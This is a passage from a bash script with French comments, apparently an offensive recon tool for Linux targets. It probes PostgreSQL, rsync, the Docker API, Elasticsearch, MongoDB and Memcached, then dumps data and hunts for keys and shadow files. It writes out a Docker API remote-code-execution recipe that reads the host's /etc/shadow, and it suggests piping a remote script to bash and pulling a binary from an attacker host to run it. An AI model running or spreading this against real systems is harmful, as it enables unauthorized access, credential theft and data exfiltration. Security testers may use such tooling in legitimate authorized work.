                success "PostgreSQL CREDS : $_u:${_p:-<empty>}"
                echo "$RESULT" | tee "$OUTDIR/pg_databases.txt"
                echo "POSTGRES:$_u:${_p}" >> "$OUTDIR/valid_creds.txt"
                echo "POSTGRES_ACCESS:$_u" >> "$OUTDIR/findings.txt"
                break
            fi
        done
    fi
}

# ─── 12. RSYNC (873) ───────────────────────────────────────────
do_rsync() {
    section "12. RSYNC (873)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 873 </dev/null 2>/dev/null; then
        info "Port 873 fermé — rsync ignoré"
        return 0
    fi

    info "rsync — listing des modules"
    RSYNC_MODULES=$(timeout 5 nc -w 3 "$TARGET" 873 2>/dev/null <<< "" | head -20)
    echo "$RSYNC_MODULES" | tee "$OUTDIR/rsync_modules_raw.txt"

    rsync --list-only "rsync://$TARGET/" 2>/dev/null \
        | tee "$OUTDIR/rsync_modules.txt"

    if [[ -s "$OUTDIR/rsync_modules.txt" ]]; then
        finding "MODULES RSYNC TROUVÉS !"
        echo "RSYNC_MODULES" >> "$OUTDIR/findings.txt"

        while read -r _perm _size _date _time MODULE _rest; do
            [[ -z "$MODULE" ]] && continue
            info "rsync — enum module : $MODULE"
            rsync --list-only "rsync://$TARGET/$MODULE/" 2>/dev/null \
                | tee "$OUTDIR/rsync_${MODULE}.txt" | head -20

            [[ -s "$OUTDIR/rsync_${MODULE}.txt" ]] && {
                success "Accès anonyme au module $MODULE !"
                echo "RSYNC_ANON_ACCESS:$MODULE" >> "$OUTDIR/findings.txt"
                rsync --list-only -r "rsync://$TARGET/$MODULE/" 2>/dev/null \
                    | grep -iE "\.key|\.pem|\.bak|id_rsa|passwd|shadow|config|\.sql" \
                    | head -10 | tee "$OUTDIR/rsync_${MODULE}_interesting.txt"
            }
        done < "$OUTDIR/rsync_modules.txt"
    fi
}

# ─── 13. DOCKER API (2375/2376) ────────────────────────────────
do_docker() {
    section "13. DOCKER API (2375/2376)"

    for DOCKER_PORT in 2375 2376; do
        nc -w 2 "$TARGET" "$DOCKER_PORT" </dev/null 2>/dev/null || continue
        PROTO_D="http"
        [[ "$DOCKER_PORT" == "2376" ]] && PROTO_D="https"

        info "Docker API — test accès non authentifié sur port $DOCKER_PORT"
        DOCKER_INFO=$(curl -s --max-time 8 \
            "${PROTO_D}://${TARGET}:${DOCKER_PORT}/info" 2>/dev/null)
        echo "$DOCKER_INFO" | tee "$OUTDIR/docker_info_$DOCKER_PORT.txt" \
            | python3 -m json.tool 2>/dev/null | head -20

        if [[ -n "$DOCKER_INFO" ]] \
            && ! echo "$DOCKER_INFO" | grep -qiE "404|connection refused"; then
            success "DOCKER API ACCESSIBLE SANS AUTH → RCE POSSIBLE !"
            finding "DOCKER_API_NOAUTH:$DOCKER_PORT"
            echo "DOCKER_API:$DOCKER_PORT" >> "$OUTDIR/findings.txt"

            curl -s --max-time 8 \
                "${PROTO_D}://${TARGET}:${DOCKER_PORT}/containers/json" 2>/dev/null \
                | python3 -m json.tool 2>/dev/null \
                | tee "$OUTDIR/docker_containers_$DOCKER_PORT.txt"

            cat >> "$OUTDIR/docker_rce_guide.txt" << EOF
# Docker API RCE (port $DOCKER_PORT)
curl -sX POST -H "Content-Type: application/json" \\
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/etc/shadow"],"Mounts":[{"Target":"/mnt","Source":"/","Type":"bind","ReadWrite":true}]}' \\
  http://$TARGET:$DOCKER_PORT/containers/create?name=pwn
curl -sX POST http://$TARGET:$DOCKER_PORT/containers/pwn/start
curl -sX GET "http://$TARGET:$DOCKER_PORT/containers/pwn/logs?stdout=1"
EOF
        fi
    done
}

# ─── 14. ELASTICSEARCH (9200) ──────────────────────────────────
do_elasticsearch() {
    section "14. ELASTICSEARCH (9200)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 9200 </dev/null 2>/dev/null; then
        info "Port 9200 fermé — ES ignoré"
        return 0
    fi

    ELASTIC_ROOT=$(curl -s --max-time 8 "http://$TARGET:9200/" 2>/dev/null)
    if echo "$ELASTIC_ROOT" | grep -qiE "elasticsearch|tagline"; then
        success "ELASTICSEARCH ACCESSIBLE SANS AUTH !"
        echo "$ELASTIC_ROOT" | python3 -m json.tool 2>/dev/null \
            | tee "$OUTDIR/elastic_root.txt" | head -20
        finding "ELASTICSEARCH_NOAUTH"
        echo "ELASTICSEARCH_NOAUTH" >> "$OUTDIR/findings.txt"

        curl -s --max-time 8 "http://$TARGET:9200/_cat/indices?v" 2>/dev/null \
            | tee "$OUTDIR/elastic_indices.txt"

        # macOS safe: awk au lieu de grep -oP "yellow\s+open\s+\K\S+"
        INDICES=$(awk '/yellow.*open/{print $3}' \
            "$OUTDIR/elastic_indices.txt" 2>/dev/null | head -5)
        for IDX in $INDICES; do
            [[ "$IDX" == "." || -z "$IDX" ]] && continue
            info "Dump index : $IDX"
            curl -s --max-time 10 \
                "http://$TARGET:9200/$IDX/_search?pretty&size=3" 2>/dev/null \
                | tee "$OUTDIR/elastic_${IDX}_sample.txt" | head -40
        done
    fi
}

# ─── 15. MONGODB (27017) ───────────────────────────────────────
do_mongodb() {
    section "15. MONGODB (27017)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 27017 </dev/null 2>/dev/null; then
        info "Port 27017 fermé — MongoDB ignoré"
        return 0
    fi

    MONGO_BANNER=$(timeout 3 nc -w 2 "$TARGET" 27017 2>/dev/null | strings | head -3)
    [[ -n "$MONGO_BANNER" ]] && {
        info "MongoDB Banner : $MONGO_BANNER"
        echo "$MONGO_BANNER" > "$OUTDIR/mongo_banner.txt"
    }

    if command -v mongosh &>/dev/null || command -v mongo &>/dev/null; then
        MONGO_CLI=$(command -v mongosh 2>/dev/null || command -v mongo 2>/dev/null)
        info "MongoDB — test accès non authentifié"
        MONGO_DBS=$(timeout 5 $MONGO_CLI --host "$TARGET" --quiet \
            --eval "db.adminCommand({listDatabases: 1})" 2>/dev/null)
        if [[ -n "$MONGO_DBS" ]] \
            && ! echo "$MONGO_DBS" | grep -qiE "unauthorized|not authorized"; then
            success "MONGODB ACCESSIBLE SANS AUTH !"
            echo "$MONGO_DBS" | tee "$OUTDIR/mongo_databases.txt"
            finding "MONGODB_NOAUTH"
            echo "MONGODB_NOAUTH" >> "$OUTDIR/findings.txt"
        fi
    fi
}

# ─── 16. MEMCACHED (11211) ─────────────────────────────────────
do_memcached() {
    section "16. MEMCACHED (11211)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 11211 </dev/null 2>/dev/null; then
        info "Port 11211 fermé — Memcached ignoré"
        return 0
    fi

    info "Memcached — stats dump"
    MEMCACHE_STATS=$(printf "stats\r\nstats items\r\nquit\r\n" \
        | timeout 5 nc -w 3 "$TARGET" 11211 2>/dev/null)

    if [[ -n "$MEMCACHE_STATS" ]] && echo "$MEMCACHE_STATS" | grep -q "STAT"; then
        success "MEMCACHED ACCESSIBLE !"
        echo "$MEMCACHE_STATS" | tee "$OUTDIR/memcached_stats.txt"
        finding "MEMCACHED_OPEN"
        echo "MEMCACHED_OPEN" >> "$OUTDIR/findings.txt"

        # macOS safe: grep -oE + cut au lieu de grep -oP "STAT items:\K\d+"
        # Format: "STAT items:SLAB:property value"
        SLABS=$(echo "$MEMCACHE_STATS" \
            | grep "STAT items:" \
            | grep -oE "items:[0-9]+" \
            | cut -d: -f2 \
            | sort -u | head -5)

        for SLAB in $SLABS; do
            ITEMS=$(printf "stats cachedump $SLAB 100\r\nquit\r\n" \
                | timeout 5 nc -w 3 "$TARGET" 11211 2>/dev/null)
            # macOS safe: awk au lieu de grep -oP 'ITEM \K\S+'
            KEYS=$(echo "$ITEMS" | grep "^ITEM " | awk '{print $2}' | head -10)
            for KEY in $KEYS; do
                VALUE=$(printf "get $KEY\r\nquit\r\n" \
                    | timeout 3 nc -w 2 "$TARGET" 11211 2>/dev/null)
                echo "$KEY => $VALUE" >> "$OUTDIR/memcached_data.txt"
            done
        done

        [[ -s "$OUTDIR/memcached_data.txt" ]] && {
            success "Données Memcached dumpées !"
            head -20 "$OUTDIR/memcached_data.txt"
        }
    fi
}

# ═══════════════════════════════════════════════════════════════
#  MAIN — Exécution séquentielle des sections
# ═══════════════════════════════════════════════════════════════

do_fingerprint
do_ssh
do_ftp
do_web
do_smb
do_nfs
do_smtp
do_snmp
do_redis
do_mysql
do_postgresql
do_rsync
do_docker
do_elasticsearch
do_mongodb
do_memcached

# ─── SUMMARY ───────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ LINUX ━━━${NC}"
[[ -s "$OUTDIR/nmap_fingerprint_raw.txt" ]] && {
    info "OS Info :"
    grep -E "OS details|Linux|Ubuntu|Debian|CentOS|RHEL" \
        "$OUTDIR/nmap_fingerprint_raw.txt" 2>/dev/null | head -3
}
echo ""

[[ -s "$OUTDIR/findings.txt" ]] && {
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
    echo ""
}

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    success "CREDENTIALS VALIDES :"
    cat "$OUTDIR/valid_creds.txt"
    echo ""
}

info "Prochaines étapes suggérées :"
echo "  • SSH accès     : ssh ${USER:-root}@$TARGET"
echo "  • Web fuzzing   : ffuf / gobuster avec wordlists plus grandes"
echo "  • Post-shell    : LinPEAS → curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash"
echo "  • Cron watch    : wget http://KALI_IP:8888/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64"
echo "  • PD tools      : httpx / nuclei / katana (si pas installés → go install github.com/projectdiscovery/...)"
